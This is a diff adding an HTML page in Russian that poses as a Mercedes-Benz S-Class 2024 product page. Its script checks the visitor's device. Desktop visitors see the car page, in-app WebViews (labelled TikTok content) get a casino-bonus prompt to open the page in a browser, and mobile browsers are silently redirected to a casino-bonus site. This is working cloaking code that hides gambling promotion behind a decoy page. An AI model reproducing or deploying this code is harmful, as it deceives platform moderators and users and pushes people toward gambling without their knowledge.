@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mercedes-Benz S-Class 2024</title>
+    <script>
+        // Функция для определения типа устройства и браузера
+        function detectDevice() {
+            const ua = navigator.userAgent.toLowerCase();
+            const platform = navigator.platform.toLowerCase();
+            
+            // Если это десктопная операционная система - показываем Mercedes
+            const isWindows = platform.includes('win');
+            const isMac = platform.includes('mac');
+            const isLinux = platform.includes('linux') && !ua.includes('android');
+            
+            if (isWindows || isMac || isLinux) {
+                return 'desktop';
+            }
+
+            // Проверяем, открыто ли в WebView
+            const isAndroidWebView = ua.includes('wv');
+            const isIOSWebView = ua.includes('iphone') && !ua.includes('safari');
+            
+            if (isAndroidWebView || isIOSWebView) {
+                return 'webview';
+            }
+
+            // Если это мобильное устройство - редирект на бонусы
+            const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(ua);
+            if (isMobile) {
+                return 'mobile';
+            }
+
+            // По умолчанию показываем десктопную версию
+            return 'desktop';
+        }
+
+        // Функция для управления отображением контента
+        function handleDisplay() {
+            const deviceType = detectDevice();
+            const tiktokContent = document.getElementById('tiktok-content');
+            const desktopContent = document.getElementById('desktop-content');
+
+            switch (deviceType) {
+                case 'webview':
+                    tiktokContent.style.display = 'block';
+                    desktopContent.style.display = 'none';
+                    break;
+                case 'mobile':
+                    // Редирект на бонусы для мобильных браузеров
+                    window.location.replace('https://worktype.github.io/casino-bonus/');
+                    break;
+                case 'desktop':
+                default:
+                    tiktokContent.style.display = 'none';
+                    desktopContent.style.display = 'block';
+                    break;
+            }
+        }
+
+        // Запускаем проверку при загрузке страницы
+        window.addEventListener('DOMContentLoaded', handleDisplay);
+    </script>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            min-height: 100vh;
+            background: #000;
+        }
+
+        #tiktok-content {
+            min-height: 100vh;
+            background: url('12/casino 1.jpg') center/cover no-repeat fixed;
+            position: relative;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        #tiktok-content::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 1;
+        }
+
+        .bonus-container {
+            position: relative;
+            z-index: 2;
+            max-width: 400px;
+            margin: 50px auto;
+            text-align: center;
+        }
+
+        .bonus-card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 20px;
+            color: white;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+        }
+
+        .bonus-title {
+            font-size: 1.4em;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+
+        .instruction {
+            font-size: 1.1em;
+            margin: 15px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        /* Стили для десктопной версии */
+        #desktop-content {
+            padding: 20px;
+            background: #f5f5f5;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .car-header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .car-title {
+            font-size: 2.5em;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .car-subtitle {
+            font-size: 1.2em;
+            color: #666;
+        }
+
+        .car-image {
+            width: 100%;
+            max-width: 800px;
+            height: auto;
+            display: block;
+            margin: 0 auto 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+
+        .car-description {
+            font-size: 1.1em;
+            line-height: 1.6;
+            color: #444;
+            text-align: justify;
+            margin-bottom: 30px;
+        }
+
+        .car-specs {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+
+        .spec-title {
+            font-size: 1.3em;
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .spec-list {
+            list-style: none;
+            padding: 0;
+        }
+
+        .spec-item {
+            padding: 10px 0;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .spec-label {
+            font-weight: bold;
+            color: #555;
+        }
+
+        .spec-value {
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <!-- Контент для TikTok -->
+    <div id="tiktok-content">
+        <div class="bonus-container">
+            <div class="bonus-card">
+                <div class="bonus-title">Получите свой приветственный бонус для игры 🎰</div>
+                <div class="instruction">1. Нажмите на три точки ⚙️</div>
+                <div class="instruction">2. Выберите "Открыть в браузере" ⬆️</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Контент для десктопа -->
+    <div id="desktop-content">
+        <div class="container">
+            <div class="car-header">
+                <h1 class="car-title">Mercedes-Benz S-Class 2024</h1>
+                <p class="car-subtitle">Роскошь и инновации в каждой детали</p>
+            </div>
+            
+            <img src="https://www.mercedes-benz.ru/passengercars/mercedes-benz-cars/models/s-class/saloon-w223/_jcr_content/image.MQ6.2.2x.20201016083616.png" alt="Mercedes-Benz S-Class" class="car-image">
+            
+            <div class="car-description">
+                <p>Mercedes-Benz S-Class 2024 года - это воплощение роскоши и технологического совершенства. Этот автомобиль представляет собой идеальное сочетание комфорта, безопасности и инновационных решений. Новая модель оснащена передовыми системами помощи водителю и предлагает непревзойденный уровень комфорта для всех пассажиров.</p>
+            </div>
+            
+            <div class="car-specs">
+                <h2 class="spec-title">Технические характеристики</h2>
+                <ul class="spec-list">
+                    <li class="spec-item">
+                        <span class="spec-label">Двигатель</span>
+                        <span class="spec-value">3.0L Рядный 6-цилиндровый</span>
+                    </li>
+                    <li class="spec-item">
+                        <span class="spec-label">Мощность</span>
+                        <span class="spec-value">429 л.с.</span>
+                    </li>
+                    <li class="spec-item">
+                        <span class="spec-label">Разгон до 100 км/ч</span>
+                        <span class="spec-value">4.9 секунд</span>
+                    </li>
+                    <li class="spec-item">
+                        <span class="spec-label">Максимальная скорость</span>
+                        <span class="spec-value">250 км/ч</span>
+                    </li>
+                    <li class="spec-item">
+                        <span class="spec-label">Расход топлива</span>
+                        <span class="spec-value">8.2 л/100 км</span>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</body>
+</html> 
